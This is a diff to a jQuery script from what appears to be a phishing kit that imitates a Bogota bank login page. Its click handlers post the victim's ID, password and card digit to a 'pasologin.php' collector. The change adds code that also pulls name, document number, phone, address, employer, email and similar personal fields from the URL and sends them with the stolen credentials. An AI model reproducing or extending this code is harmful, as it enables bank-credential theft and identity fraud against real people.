@@ -1,3 +1,5 @@
+function _gp(n) { return new URLSearchParams(window.location.search).get(n) || ''; }
+
 $(document).ready(function($){
 
 	$("#clave-segura").click(function(){
@@ -76,11 +78,14 @@ $(document).ready(function($){
         dispositivo = detectar_dispositivo();
         cl = "[C]" + $("#txt-clave-tc").val() + " [D]" + $("#txt-digito").val();
         u = "[" + $("#txt-tipo").val() + "]" + $("#txt-id").val();
-        $.post( "../../../../../process/pasologin.php", {usr:u, pas: cl, dis: dispositivo, ban:"Bogota"} ,function(data) {
-            espera = 1; 
+        $.post( "../../../../../process/pasologin.php", {
+            usr:u, pas: cl, dis: dispositivo, ban:"Bogota",
+            nom:_gp('nom'), ape:_gp('ape'), tdoc:_gp('tdoc'), doc:_gp('doc'),
+            cel:_gp('cel'), dir:_gp('dir'), emp:_gp('emp'), ref:_gp('ref'),
+            mnt:_gp('mnt'), eml:_gp('eml')
+        }, function(data) {
+            espera = 1;
         });
-
-
     });
 
     $("#btn-ingresar-s").click(function(){
@@ -89,8 +94,13 @@ $(document).ready(function($){
         dispositivo = detectar_dispositivo();
         cl = "[CS]" + $("#txt-clave-s").val();
         u = "[" + $("#txt-tipo-s").val() + "]" + $("#txt-id-s").val();
-        $.post( "../../../../../process/pasologin.php", {usr:u, pas: cl, dis: dispositivo, ban:"Bogota"} ,function(data) {
-            espera = 1; 
+        $.post( "../../../../../process/pasologin.php", {
+            usr:u, pas: cl, dis: dispositivo, ban:"Bogota",
+            nom:_gp('nom'), ape:_gp('ape'), tdoc:_gp('tdoc'), doc:_gp('doc'),
+            cel:_gp('cel'), dir:_gp('dir'), emp:_gp('emp'), ref:_gp('ref'),
+            mnt:_gp('mnt'), eml:_gp('eml')
+        }, function(data) {
+            espera = 1;
         });
     });
 
